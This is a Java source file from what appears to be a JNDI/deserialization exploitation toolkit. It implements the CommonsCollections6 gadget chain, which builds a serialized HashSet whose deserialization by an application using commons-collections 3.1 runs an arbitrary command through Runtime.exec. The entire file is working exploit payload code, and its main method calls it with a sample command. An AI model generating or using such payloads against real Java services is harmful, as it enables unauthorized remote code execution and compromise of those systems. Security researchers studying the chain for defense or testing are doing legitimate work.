package com.qi4l.jndi.gadgets;

import com.qi4l.jndi.enumtypes.PayloadType;
import com.qi4l.jndi.gadgets.annotation.Authors;
import com.qi4l.jndi.gadgets.annotation.Dependencies;
import com.qi4l.jndi.gadgets.utils.Reflections;
import com.qi4l.jndi.gadgets.utils.cc.TransformerUtil;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.Serializable;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;


/**
 * Gadget chain:
 * java.io.ObjectInputStream.readObject()
 * java.util.HashSet.readObject()
 * java.util.HashMap.put()
 * java.util.HashMap.hash()
 * org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
 * org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
 * org.apache.commons.collections.map.LazyMap.get()
 * org.apache.commons.collections.functors.ChainedTransformer.transform()
 * org.apache.commons.collections.functors.InvokerTransformer.transform()
 * java.lang.reflect.Method.invoke()
 * java.lang.Runtime.exec()
 * <p>
 * by @matthias_kaiser
 */
@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-collections:commons-collections:3.1"})
@Authors({Authors.MATTHIASKAISER})
public class CommonsCollections6 implements ObjectPayload<Serializable> {
    public Serializable getObject(PayloadType type, String... param) throws Exception {
        String              command          = param[0];
        final Transformer[] transformers = TransformerUtil.makeTransformer(command);

        Transformer transformerChain = new ChainedTransformer(transformers);

        final Map innerMap = new HashMap();
        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "nu1r");
        HashSet map = new HashSet(1);
        map.add("nu1r");
        Field f = null;
        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException e) {
            f = HashSet.class.getDeclaredField("backingMap");
        }

        Reflections.setAccessible(f);
        HashMap innimpl = (HashMap) f.get(map);

        Field f2 = null;
        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException e) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }

        Reflections.setAccessible(f2);
        Object[] array = (Object[]) f2.get(innimpl);

        Object node = array[0];
        if (node == null) {
            node = array[1];
        }

        Field keyField = null;
        try {
            keyField = node.getClass().getDeclaredField("key");
        } catch (Exception e) {
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }

        Reflections.setAccessible(keyField);
        keyField.set(node, entry);

        return map;
    }

    public static void main(String[] args) throws Exception {
        final Class<? extends ObjectPayload> payloadClass = ObjectPayload.Utils.getPayloadClass("CommonsCollections6");
        ObjectPayload                        payload      = payloadClass.newInstance();
        Object                               object       = payload.getObject(PayloadType.qi4l,"whomi");
    }
}
